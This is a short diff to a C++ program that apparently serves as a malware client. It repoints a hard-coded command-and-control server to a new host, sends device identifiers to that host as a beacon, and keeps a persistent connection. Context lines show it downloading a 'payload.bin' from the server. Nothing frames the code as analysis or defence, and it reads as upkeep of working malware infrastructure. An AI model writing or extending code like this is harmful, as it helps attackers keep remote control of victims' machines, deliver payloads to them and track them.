@@ -78,7 +78,7 @@ void sendDeviceData(const std::string& deviceId, const std::string& deviceName, 
         return;
     }
 
-    std::string url = "http://your-dashboard-server:8000/devices";
+    std::string url = "http://newmethod-abhopeful.wasmer.app/devices";
     HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (!hFile) {
         std::cerr << "Failed to open URL." << std::endl;
@@ -96,7 +96,7 @@ void sendDeviceData(const std::string& deviceId, const std::string& deviceName, 
 
 int main() {
     // Example usage
-    std::string c2Server = "http://abhope.eu.org:8000";
+    std::string c2Server = "http://newmethod-abhopeful.wasmer.app";
     std::string payloadUrl = c2Server + "/payload.bin";
     std::string outputFile = "downloaded_payload.bin";
 
@@ -108,7 +108,7 @@ int main() {
     persistentConnection.detach();
 
     // Send device data to the dashboard
-    sendDeviceData("1", "http://abhope.eu.org:8000/devices");
+    sendDeviceData("1", "Device 1", "192.168.1.2");
 
     std::cout << "Payload downloaded and beacon sent successfully." << std::endl;
 
